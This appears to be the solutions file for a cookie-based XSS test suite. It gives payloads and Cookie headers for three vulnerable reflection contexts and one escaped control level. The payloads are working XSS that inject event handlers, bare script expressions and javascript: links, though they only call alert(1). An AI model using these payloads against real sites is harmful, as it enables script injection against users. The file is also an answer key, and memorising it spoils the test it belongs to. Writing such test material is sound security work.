# cookiectx — solutions

A single named cookie value is reflected into three different sink contexts,
plus one escaped control. A cookie value cannot carry a raw double quote (the
cookie parser truncates the value at the first `"`), so every breakout here
uses cookie-safe bytes only — space, `=`, `(`, `)`, `<`, `>`.

### cookiectx-level1

`[Cookie] /cookiectx/level1/`

- payload: `x onmouseover=alert(1)`
- context: the `theme` cookie lands in an unquoted `class` attribute; a
  space-separated event handler needs no quote breakout
- header: `Cookie: theme=x onmouseover=alert(1)`

### cookiectx-level2

`[Cookie] /cookiectx/level2/`

- payload: `alert(1)`
- context: the `uid` cookie is the right-hand side of a `var` assignment inside
  an inline `<script>`, so a bare expression runs on load
- header: `Cookie: uid=alert(1)`

### cookiectx-level3

`[Cookie] /cookiectx/level3/`

- payload: `javascript:alert(1)`
- context: the `next` cookie is used verbatim as an `<a href>`; the
  `javascript:` scheme executes on click and is not filtered
- header: `Cookie: next=javascript:alert(1)`

### cookiectx-level4

`[Cookie] /cookiectx/level4/`

- payload: `no payload — control`
- context: the `lang` cookie is HTML-escaped before reflection, so no markup can
  form and nothing executes. Reporting no XSS here is the correct result.
- header: `Cookie: lang=<svg onload=alert(1)>`
